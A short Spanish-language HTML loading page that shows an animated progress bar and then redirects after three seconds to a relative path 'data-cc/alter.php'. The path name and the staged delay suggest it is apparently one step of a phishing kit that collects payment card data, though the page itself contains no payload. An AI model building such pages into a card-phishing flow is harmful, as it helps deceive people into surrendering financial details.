<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Cargando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #ffffff; /* fondo blanco */
    }

    .loader-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
    }

    .loader-bar {
      width: 60%;
      max-width: 400px;
      height: 6px;
      background: #e0e0e0;   /* gris de fondo de la barra */
      overflow: hidden;
      border-radius: 3px;
    }

    .loader-bar-inner {
      width: 0;
      height: 100%;
      background: #007bff;   /* azul */
      animation: loading 2s linear forwards;
    }

    @keyframes loading {
      from { width: 0; }
      to   { width: 100%; }
    }
  </style>
</head>
<body>
  <div class="loader-wrapper">
    <div class="loader-bar">
      <div class="loader-bar-inner"></div>
    </div>
  </div>

  <script>
    setTimeout(() => {
      window.location.href = "../../../../data-cc/alter.php";
    }, 3000);
  </script>

</body>
</html>
